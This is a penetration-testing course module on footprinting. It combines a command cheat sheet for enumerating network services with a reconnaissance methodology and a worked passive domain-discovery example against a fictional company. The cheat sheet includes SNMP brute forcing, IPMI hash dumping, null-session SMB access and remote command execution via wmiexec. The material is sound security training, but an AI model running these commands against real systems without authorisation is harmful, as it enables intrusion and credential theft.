
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">

<h1 id="2-footprinting">2. Footprinting</h1>
<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h3 id="infrastructure-based-enumeration">Infrastructure-based Enumeration</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>`curl -s <a href="https://crt.sh/\?q\=">https://crt.sh/\?q\=</a><target-domain>\&amp;output\=json \</td>
<td>jq .`</td>
<td>Certificate transparency.</td>
</tr>
<tr>
<td><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></td>
<td>Scan each IP address in a list using Shodan.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="host-based-enumeration">Host-based Enumeration</h3>
<p><strong>FTP</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ftp &lt;FQDN/IP&gt;</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr>
<td><code>nc -nv &lt;FQDN/IP&gt; 21</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr>
<td><code>telnet &lt;FQDN/IP&gt; 21</code></td>
<td>Interact with the FTP service on the target.</td>
</tr>
<tr>
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code></td>
<td>Interact with the FTP service on the target using encrypted connection.</td>
</tr>
<tr>
<td><code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code></td>
<td>Download all available files on the target FTP server.</td>
</tr>
</tbody>
</table>
<p><strong>SMB</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>smbclient -N -L //&lt;FQDN/IP&gt;</code></td>
<td>Null session authentication on SMB.</td>
</tr>
<tr>
<td><code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code></td>
<td>Connect to a specific SMB share.</td>
</tr>
<tr>
<td><code>rpcclient -U &quot;&quot; &lt;FQDN/IP&gt;</code></td>
<td>Interaction with the target using RPC.</td>
</tr>
<tr>
<td><code>samrdump.py &lt;FQDN/IP&gt;</code></td>
<td>Username enumeration using Impacket scripts.</td>
</tr>
<tr>
<td><code>smbmap -H &lt;FQDN/IP&gt;</code></td>
<td>Enumerating SMB shares.</td>
</tr>
<tr>
<td><code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u &#39;&#39; -p &#39;&#39;</code></td>
<td>Enumerating SMB shares using null session authentication.</td>
</tr>
<tr>
<td><code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code></td>
<td>SMB enumeration using enum4linux.</td>
</tr>
</tbody>
</table>
<p><strong>NFS</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>showmount -e &lt;FQDN/IP&gt;</code></td>
<td>Show available NFS shares.</td>
</tr>
<tr>
<td><code>mount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code></td>
<td>Mount the specific NFS share.umount ./target-NFS</td>
</tr>
<tr>
<td><code>umount ./target-NFS</code></td>
<td>Unmount the specific NFS share.</td>
</tr>
</tbody>
</table>
<p><strong>DNS</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dig ns &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>NS request to the specific nameserver.</td>
</tr>
<tr>
<td><code>dig any &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>ANY request to the specific nameserver.</td>
</tr>
<tr>
<td><code>dig axfr &lt;domain.tld&gt; @&lt;nameserver&gt;</code></td>
<td>AXFR request to the specific nameserver.</td>
</tr>
<tr>
<td><code>dnsenum --dnsserver &lt;nameserver&gt; --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld&gt;</code></td>
<td>Subdomain brute forcing.</td>
</tr>
</tbody>
</table>
<p><strong>SMTP</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>telnet &lt;FQDN/IP&gt; 25</code></td>
</tr>
</tbody>
</table>
<p><strong>IMAP/POP3</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>curl -k &#39;imaps://&lt;FQDN/IP&gt;&#39; --user &lt;user&gt;:&lt;password&gt;</code></td>
<td>Log in to the IMAPS service using cURL.</td>
</tr>
<tr>
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:imaps</code></td>
<td>Connect to the IMAPS service.</td>
</tr>
<tr>
<td><code>openssl s_client -connect &lt;FQDN/IP&gt;:pop3s</code></td>
<td>Connect to the POP3s service.</td>
</tr>
</tbody>
</table>
<p><strong>SNMP</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>snmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code></td>
<td>Querying OIDs using snmpwalk.</td>
</tr>
<tr>
<td><code>onesixtyone -c community-strings.list &lt;FQDN/IP&gt;</code></td>
<td>Bruteforcing community strings of the SNMP service.</td>
</tr>
<tr>
<td><code>braa &lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</code></td>
<td>Bruteforcing SNMP service OIDs.</td>
</tr>
</tbody>
</table>
<p><strong>MySQL</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;FQDN/IP&gt;</code></td>
<td>Login to the MySQL server.</td>
</tr>
</tbody>
</table>
<p><strong>MSSQL</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mssqlclient.py &lt;user&gt;@&lt;FQDN/IP&gt; -windows-auth</code></td>
<td>Log in to the MSSQL server using Windows authentication.</td>
</tr>
</tbody>
</table>
<p><strong>IPMI</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code></td>
<td>IPMI version detection.</td>
</tr>
<tr>
<td><code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code></td>
<td>Dump IPMI hashes.</td>
</tr>
</tbody>
</table>
<p><strong>Linux Remote Management</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ssh-audit.py &lt;FQDN/IP&gt;</code></td>
<td>Remote security audit against the target SSH service.</td>
</tr>
<tr>
<td><code>ssh &lt;user&gt;@&lt;FQDN/IP&gt;</code></td>
<td>Log in to the SSH server using the SSH client.</td>
</tr>
<tr>
<td><code>ssh -i private.key &lt;user&gt;@&lt;FQDN/IP&gt;</code></td>
<td>Log in to the SSH server using private key.</td>
</tr>
<tr>
<td><code>ssh &lt;user&gt;@&lt;FQDN/IP&gt; -o PreferredAuthentications=password</code></td>
<td>Enforce password-based authentication.</td>
</tr>
</tbody>
</table>
<p><strong>Windows Remote Management</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rdp-sec-check.pl &lt;FQDN/IP&gt;</code></td>
<td>Check the security settings of the RDP service.</td>
</tr>
<tr>
<td><code>xfreerdp /u:&lt;user&gt; /p:&quot;&lt;password&gt;&quot; /v:&lt;FQDN/IP&gt;</code></td>
<td>Log in to the RDP server from Linux.</td>
</tr>
<tr>
<td><code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code></td>
<td>Log in to the WinRM server.</td>
</tr>
<tr>
<td><code>wmiexec.py &lt;user&gt;:&quot;&lt;password&gt;&quot;@&lt;FQDN/IP&gt; &quot;&lt;system command&gt;&quot;</code></td>
<td>Execute command using the WMI service.</td>
</tr>
</tbody>
</table>
<p><strong>Oracle TNS</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>./odat.py all -s &lt;FQDN/IP&gt;</code></td>
<td>Perform a variety of scans to gather information about the Oracle database services and its components.</td>
</tr>
<tr>
<td><code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;FQDN/IP&gt;/&lt;db&gt;</code></td>
<td>Log in to the Oracle database.</td>
</tr>
<tr>
<td><code>./odat.py utlfile -s &lt;FQDN/IP&gt; -d &lt;db&gt; -U &lt;user&gt; -P &lt;pass&gt; --sysdba --putFile C:\\insert\\path file.txt ./file.txt</code></td>
<td>Upload a file with Oracle RDBMS.</td>
</tr>
</tbody>
</table>
<h2 id="enumeration-principles">Enumeration Principles</h2>
<hr>
<p>Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is an independent procedure and should be performed separately from enumeration because <code>OSINT is based exclusively on passive information gathering</code> and does not involve active enumeration of the given target. Enumeration is a loop in which we repeatedly gather information based on what data we have or have already discovered.</p>
<p>Information can be gathered from domains, IP addresses, accessible services, and many other sources.</p>
<p>Once we have identified targets in our client&#39;s infrastructure, we need to examine the individual services and protocols. In most cases, these are services that enable communication between customers, the infrastructure, the administration, and the employees.</p>
<p>If we imagine that we have been hired to investigate the IT security of a company, we will start to develop a general understanding of the company&#39;s functionality. For example, we need to understand how the company is structured, what services and third-party vendors it uses, what security measures may be in place, and more. This is where this stage can be a bit misunderstood because most people focus on the obvious and try to force their way into the company&#39;s systems instead of understanding how the infrastructure is set up and what technical aspects and services are necessary to be able to offer a specific service.</p>
<p>An example of such a wrong approach could be that after finding authentication services like SSH, RDP, WinRM, and the like, we try to brute-force with common/weak passwords and usernames. Unfortunately, brute-forcing is a noisy method and can easily lead to blacklisting, making further testing impossible. Primarily, this can happen if we do not know about the company&#39;s defensive security measures and its infrastructure. Some may smile at this approach, but experience has shown that far too many testers take this type of approach.</p>
<p><code>Our goal is not to get at the systems but to find all the ways to get there.</code></p>
<p>We can think of this as an analogy of a treasure hunter preparing for his expedition. He would not just grab a shovel and start digging in some random spot, but he would plan and gather his gear and study maps and learn about the terrain he has to cover and where the treasure may be so he can bring the proper tools. If he goes around digging holes everywhere, he will cause damage, waste time and energy, and likely never achieve his goal. The same can be said for understanding a company&#39;s internal and external infrastructure, mapping it out, and carefully formulating our plan of attack.</p>
<p>The enumeration principles are based on some questions that will facilitate all our investigations in any conceivable situation. In most cases, the main focus of many penetration testers is on what they can see and not on what they cannot see. However, even what we cannot see is relevant to us and may well be of great importance. The difference here is that we start to see the components and aspects that are not visible at first glance with our experience.</p>
<ul>
<li>What can we see?</li>
<li>What reasons can we have for seeing it?</li>
<li>What image does what we see create for us?</li>
<li>What do we gain from it?</li>
<li>How can we use it?</li>
<li>What can we not see?</li>
<li>What reasons can there be that we do not see?</li>
<li>What image results for us from what we do not see?</li>
</ul>
<p>An important aspect that must not be confused here is that there are always exceptions to the rules. The principles, however, do not change. Another advantage of these principles is that we can see from the practical tasks that we do not lack penetration testing abilities but technical understanding when we suddenly do not know how to proceed because our core task is not to exploit the machines but to find how they can be exploited.</p>
<table>
<thead>
<tr>
<th><strong><code>No.</code></strong></th>
<th><strong><code>Principle</code></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1.</td>
<td>There is more than meets the eye. Consider all points of view.</td>
</tr>
<tr>
<td>2.</td>
<td>Distinguish between what we see and what we do not see.</td>
</tr>
<tr>
<td>3.</td>
<td>There are always ways to gain more information. Understand the target.</td>
</tr>
</tbody>
</table>
<p>To familiarize ourselves with these principles, we should write down these questions and principles where we can always see them and refer back to them with ease.\</p>
<h2 id="enumeration-methodology">Enumeration Methodology</h2>
<hr>
<p>Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer us, it is almost unpredictable how our approach should be designed. Therefore, most penetration testers follow their habits and the steps they feel most comfortable and familiar with. However, this is not a standardized methodology but rather an experience-based approach.</p>
<p>We know that penetration testing, and therefore enumeration, is a dynamic process. Consequently, we have developed a static enumeration methodology for external and internal penetration tests that includes free dynamics and allows for a wide range of changes and adaptations to the given environment. This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:</p>
<table>
<thead>
<tr>
<th><code>Infrastructure-based enumeration</code></th>
<th><code>Host-based enumeration</code></th>
<th><code>OS-based enumeration</code></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p><img src="https://academy.hackthebox.com/storage/modules/112/enum-method3.png" alt="image"></p>
<p>Note: The components of each layer shown represent the main categories and not a full list of all the components to search for. Additionally, it must be mentioned here that the first and second layer (Internet Presence, Gateway) does not quite apply to the intranet, such as an Active Directory infrastructure. The layers for internal infrastructure will be covered in other modules.</p>
<p>Consider these lines as some kind of obstacle, like a wall, for example. What we do here is look around to find out where the entrance is, or the gap we can fit through, or climb over to get closer to our goal. Theoretically, it is also possible to go through the wall headfirst, but very often, it happens that the spot we have smashed the gap with a lot of effort and time with force does not bring us much because there is no entry at this point of the wall to pass on to the next wall.</p>
<p>These layers are designed as follows:</p>
<table>
<thead>
<tr>
<th><strong>Layer</strong></th>
<th><strong>Description</strong></th>
<th><strong>Information Categories</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1. Internet Presence</code></td>
<td>Identification of internet presence and externally accessible infrastructure.</td>
<td>Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</td>
</tr>
<tr>
<td><code>2. Gateway</code></td>
<td>Identify the possible security measures to protect the company&#39;s external and internal infrastructure.</td>
<td>Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</td>
</tr>
<tr>
<td><code>3. Accessible Services</code></td>
<td>Identify accessible interfaces and services that are hosted externally or internally.</td>
<td>Service Type, Functionality, Configuration, Port, Version, Interface</td>
</tr>
<tr>
<td><code>4. Processes</code></td>
<td>Identify the internal processes, sources, and destinations associated with the services.</td>
<td>PID, Processed Data, Tasks, Source, Destination</td>
</tr>
<tr>
<td><code>5. Privileges</code></td>
<td>Identification of the internal permissions and privileges to the accessible services.</td>
<td>Groups, Users, Permissions, Restrictions, Environment</td>
</tr>
<tr>
<td><code>6. OS Setup</code></td>
<td>Identification of the internal components and systems setup.</td>
<td>OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</td>
</tr>
</tbody>
</table>
<p>Important note: The human aspect and the information that can be obtained by employees using OSINT have been removed from the &quot;Internet Presence&quot; layer for simplicity.</p>
<p>We can finally imagine the entire penetration test in the form of a labyrinth where we have to identify the gaps and find the way to get us inside as quickly and effectively as possible. This type of labyrinth may look something like this:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png" alt="image"></p>
<p>The squares represent the gaps/vulnerabilities.</p>
<p>As we have probably already noticed, we can see that we will encounter one gap and very likely several. The interesting and very common fact is that not all the gaps we find can lead us inside. All penetration tests are limited in time, but we should always keep in mind that one belief that there is nearly always a way in. Even after a four-week penetration test, we cannot say 100% that there are no more vulnerabilities. Someone who has been studying the company for months and analyzing them will most likely have a much greater understanding of the applications and structure than we were able to gain within the few weeks we spent on the asessment. An excellent and recent example of this is the <a href="https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack">cyber attack on SolarWinds</a>, which happened not too long ago. This is another excellent reason for a methodology that must exclude such cases.</p>
<p>Let us assume that we have been asked to perform an external &quot;black box&quot; penetration test. Once all the necessary contract items have been completely fulfilled, our penetration test will begin at the specified time.</p>
<hr>
<h3 id="layer-no-1-internet-presence">Layer No.1: Internet Presence</h3>
<p>The first layer we have to pass is the &quot;Internet Presence&quot; layer, where we focus on finding the targets we can investigate. If the scope in the contract allows us to look for additional hosts, this layer is even more critical than for fixed targets only. In this layer, we use different techniques to find domains, subdomains, netblocks, and many other components and information that present the presence of the company and its infrastructure on the Internet.</p>
<p><code>The goal of this layer is to identify all possible target systems and interfaces that can be tested.</code></p>
<hr>
<h3 id="layer-no-2-gateway">Layer No.2: Gateway</h3>
<p>Here we try to understand the interface of the reachable target, how it is protected, and where it is located in the network. Due to the diversity, different functionalities, and some particular procedures, we will go into more detail about this layer in other modules.</p>
<p><code>The goal is to understand what we are dealing with and what we have to watch out for.</code></p>
<hr>
<h3 id="layer-no-3-accessible-services">Layer No.3: Accessible Services</h3>
<p>In the case of accessible services, we examine each destination for all the services it offers. Each of these services has a specific purpose that has been installed for a particular reason by the administrator. Each service has certain functions, which therefore also lead to specific results. To work effectively with them, we need to know how they work. Otherwise, we need to learn to understand them.</p>
<p><code>This layer aims to understand the reason and functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.</code></p>
<p>This is the part of enumeration we will mainly deal with in this module.</p>
<hr>
<h3 id="layer-no-4-processes">Layer No.4: Processes</h3>
<p>Every time a command or function is executed, data is processed, whether entered by the user or generated by the system. This starts a process that has to perform specific tasks, and such tasks have at least one source and one target.</p>
<p><code>The goal here is to understand these factors and identify the dependencies between them.</code></p>
<hr>
<h3 id="layer-no-5-privileges">Layer No.5: Privileges</h3>
<p>Each service runs through a specific user in a particular group with permissions and privileges defined by the administrator or the system. These privileges often provide us with functions that administrators overlook. This often happens in Active Directory infrastructures and many other case-specific administration environments and servers where users are responsible for multiple administration areas.</p>
<p><code>It is crucial to identify these and understand what is and is not possible with these privileges.</code></p>
<hr>
<h3 id="layer-no-6-os-setup">Layer No.6: OS Setup</h3>
<p>Here we collect information about the actual operating system and its setup using internal access. This gives us a good overview of the internal security of the systems and reflects the skills and capabilities of the company&#39;s administrative teams.</p>
<p><code>The goal here is to see how the administrators manage the systems and what sensitive internal information we can glean from them.</code></p>
<hr>
<h3 id="enumeration-methodology-in-practice">Enumeration Methodology in Practice</h3>
<p>A methodology summarizes all systematic procedures in obtaining knowledge within the bounds of a given objective. It is important to note that a methodology is not a step-by-step guide but, as the definition implies, a summary of systematic procedures. In our case, the enumeration methodology is the systematic approach to explore a given target.</p>
<p>How the individual components are identified and information obtained in this methodology is a dynamic and growing aspect that is constantly changing and can therefore differ. An excellent example of this is using information-gathering tools from web servers. There are countless different tools for this, and each of them has a specific focus and therefore delivers individual results that differ from other applications. The goal, however, is the same. Thus, the collection of tools and commands is not part of the actual methodology but rather a cheat sheet that we can refer to using the commands and tools listed in given cases.</p>
<h2 id="domain-information">Domain Information</h2>
<hr>
<p>Domain information is a core component of any penetration test, and it is not just about the subdomains but about the entire presence on the Internet. Therefore, we gather information and try to understand the company&#39;s functionality and which technologies and structures are necessary for services to be offered successfully and efficiently.</p>
<p>This type of information is gathered passively without direct and active scans. In other words, we remain hidden and navigate as &quot;customers&quot; or &quot;visitors&quot; to avoid direct connections to the company that could expose us. The OSINT relevant sections are only a tiny part of how in-depth OSINT goes and describe only a few of the many ways to obtain information in this way. More approaches and strategies for this can be found in the module <a href="https://academy.hackthebox.com/course/preview/osint-corporate-recon">OSINT: Corporate Recon</a>.</p>
<p>However, when <code>passively</code> gathering information, we can use third-party services to understand the company better. However, the first thing we should do is scrutinize the company&#39;s <code>main website</code>. Then, we should read through the texts, keeping in mind what technologies and structures are needed for these services.</p>
<p>For example, many IT companies offer app development, IoT, hosting, data science, and IT security services, depending on their industry. If we encounter a service that we have had little to do with before, it makes sense and is necessary to get to grips with it and find out what activities it consists of and what opportunities are available. Those services also give us a good overview of how the company can be structured.</p>
<p>For example, this part is the combination between the <code>first principle</code> and the <code>second principle</code> of enumeration. We pay attention to what <code>we see</code> and <code>we do not see</code>. We see the services but not their functionality. However, services are bound to certain technical aspects necessary to provide a service. Therefore, we take the developer&#39;s view and look at the whole thing from their point of view. This point of view allows us to gain many technical insights into the functionality.</p>
<hr>
<h3 id="online-presence">Online Presence</h3>
<p>Once we have a basic understanding of the company and its services, we can get a first impression of its presence on the Internet. Let us assume that a medium-sized company has hired us to test their entire infrastructure from a black-box perspective. This means we have only received a scope of targets and must obtain all further information ourselves.</p>
<p>Note: Please remember that the examples below will differ from the practical exercises and will not give the same results. However, the examples are based on real penetration tests and illustrate how and what information can be obtained.</p>
<p>The first point of presence on the Internet may be the <code>SSL certificate</code> from the company&#39;s main website that we can examine. Often, such a certificate includes more than just a subdomain, and this means that the certificate is used for several domains, and these are most likely still active.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/DomInfo-1.png" alt=""></p>
<p>Another source to find more subdomains is <a href="https://crt.sh/">crt.sh</a>. This source is <a href="https://en.wikipedia.org/wiki/Certificate\_Transparency">Certificate Transparency</a> logs. Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections. The standard (<a href="https://tools.ietf.org/html/rfc6962">RFC 6962</a>) provides for the logging of all digital certificates issued by a certificate authority in audit-proof logs. This is intended to enable the detection of false or maliciously issued certificates for a domain. SSL certificate providers like <a href="https://letsencrypt.org/">Let&#39;s Encrypt</a> share this with the web interface <a href="https://crt.sh/">crt.sh</a>, which stores the new entries in the database to be accessed later.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/112/DomInfo-2.png" alt=""></p>
<p>We can also output the results in JSON format.</p>
<p><strong>Certificate Transparency</strong></p>
<p>Domain Information</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -s https:/</span><span class="hljs-regexp">/crt.sh/</span><span class="hljs-string">\?q\=inlanefreight.com\&amp;output\=json</span> | jq .

[
  {
    <span class="hljs-string">"issuer_ca_id"</span>: <span class="hljs-number">23451835427</span>,
    <span class="hljs-string">"issuer_name"</span>: <span class="hljs-string">"C=US, O=Let's Encrypt, CN=R3"</span>,
    <span class="hljs-string">"common_name"</span>: <span class="hljs-string">"matomo.inlanefreight.com"</span>,
    <span class="hljs-string">"name_value"</span>: <span class="hljs-string">"matomo.inlanefreight.com"</span>,
    <span class="hljs-string">"id"</span>: <span class="hljs-number">50815783237226155</span>,
    <span class="hljs-string">"entry_timestamp"</span>: <span class="hljs-string">"2021-08-21T06:00:17.173"</span>,
    <span class="hljs-string">"not_before"</span>: <span class="hljs-string">"2021-08-21T05:00:16"</span>,
    <span class="hljs-string">"not_after"</span>: <span class="hljs-string">"2021-11-19T05:00:15"</span>,
    <span class="hljs-string">"serial_number"</span>: <span class="hljs-string">"03abe9017d6de5eda90"</span>
  },
  {
    <span class="hljs-string">"issuer_ca_id"</span>: <span class="hljs-number">6864563267</span>,
    <span class="hljs-string">"issuer_name"</span>: <span class="hljs-string">"C=US, O=Let's Encrypt, CN=R3"</span>,
    <span class="hljs-string">"common_name"</span>: <span class="hljs-string">"matomo.inlanefreight.com"</span>,
    <span class="hljs-string">"name_value"</span>: <span class="hljs-string">"matomo.inlanefreight.com"</span>,
    <span class="hljs-string">"id"</span>: <span class="hljs-number">5081529377</span>,
    <span class="hljs-string">"entry_timestamp"</span>: <span class="hljs-string">"2021-08-21T06:00:16.932"</span>,
    <span class="hljs-string">"not_before"</span>: <span class="hljs-string">"2021-08-21T05:00:16"</span>,
    <span class="hljs-string">"not_after"</span>: <span class="hljs-string">"2021-11-19T05:00:15"</span>,
    <span class="hljs-string">"serial_number"</span>: <span class="hljs-string">"03abe90104e271c98a90"</span>
  },
  {
    <span class="hljs-string">"issuer_ca_id"</span>: <span class="hljs-number">113123452</span>,
    <span class="hljs-string">"issuer_name"</span>: <span class="hljs-string">"C=US, O=Let's Encrypt, CN=R3"</span>,
    <span class="hljs-string">"common_name"</span>: <span class="hljs-string">"smartfactory.inlanefreight.com"</span>,
    <span class="hljs-string">"name_value"</span>: <span class="hljs-string">"smartfactory.inlanefreight.com"</span>,
    <span class="hljs-string">"id"</span>: <span class="hljs-number">4941235512141012357</span>,
    <span class="hljs-string">"entry_timestamp"</span>: <span class="hljs-string">"2021-07-27T00:32:48.071"</span>,
    <span class="hljs-string">"not_before"</span>: <span class="hljs-string">"2021-07-26T23:32:47"</span>,
    <span class="hljs-string">"not_after"</span>: <span class="hljs-string">"2021-10-24T23:32:45"</span>,
    <span class="hljs-string">"serial_number"</span>: <span class="hljs-string">"044bac5fcc4d59329ecbbe9043dd9d5d0878"</span>
  },
  { ... SNIP ...
</code></pre>
<p>If needed, we can also have them filtered by the unique subdomains.</p>
<p>Domain Information</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s https:<span class="hljs-comment">//crt.sh/\?q\=inlanefreight.com\&amp;output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u</span>

account<span class="hljs-selector-class">.ttn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
blog<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
bots<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
console<span class="hljs-selector-class">.ttn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
ct<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
data<span class="hljs-selector-class">.ttn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
*<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
inlanefreight<span class="hljs-selector-class">.com</span>
integrations<span class="hljs-selector-class">.ttn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
iot<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
mails<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
marina<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
marina-live<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
matomo<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
next<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
noc<span class="hljs-selector-class">.ttn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
preview<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
shop<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
smartfactory<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
ttn<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
vx<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
www<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
</code></pre>
<p>Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.</p>
<p><strong>Company Hosted Servers</strong></p>
<p>Domain Information</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep <span class="hljs-string">"has address"</span> | grep inlanefreight.com | cut -d<span class="hljs-string">" "</span> -f1,<span class="hljs-number">4</span>;done

blog.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.24</span><span class="hljs-number">.93</span>
inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.27</span><span class="hljs-number">.33</span>
matomo.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.127</span><span class="hljs-number">.22</span>
www.inlanefreight.com <span class="hljs-number">10.129</span><span class="hljs-number">.127</span><span class="hljs-number">.33</span>
s3-website-us-west<span class="hljs-number">-2.</span>amazonaws.com <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.250</span>
</code></pre>
<p>Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the <code>cut</code> command and run them through <code>Shodan</code>.</p>
<p><a href="https://www.shodan.io/">Shodan</a> can be used to find devices and systems permanently connected to the Internet like <code>Internet of Things</code> (<code>IoT</code>). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria. For example, open HTTP or HTTPS ports and other server ports for <code>FTP</code>, <code>SSH</code>, <code>SNMP</code>, <code>Telnet</code>, <code>RTSP</code>, or <code>SIP</code> are searched. As a result, we can find devices and systems, such as <code>surveillance cameras</code>, <code>servers</code>, <code>smart home systems</code>, <code>industrial controllers</code>, <code>traffic lights</code> and <code>traffic controllers</code>, and various network components.</p>
<p><strong>Shodan - IP List</strong></p>
<p>Domain Information</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(cat subdomainlist);do host $i | grep <span class="hljs-string">"has address"</span> | grep inlanefreight.com | cut -d<span class="hljs-string">" "</span> -f4 &gt;&gt; ip-addresses.txt;done
root<span class="hljs-meta">@htb</span>[/htb]$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(cat ip-addresses.txt);do shodan host $i;done

<span class="hljs-number">10.129</span><span class="hljs-number">.24</span><span class="hljs-number">.93</span>
<span class="hljs-string">City:</span>                    Berlin
<span class="hljs-string">Country:</span>                 Germany
<span class="hljs-string">Organization:</span>            InlaneFreight
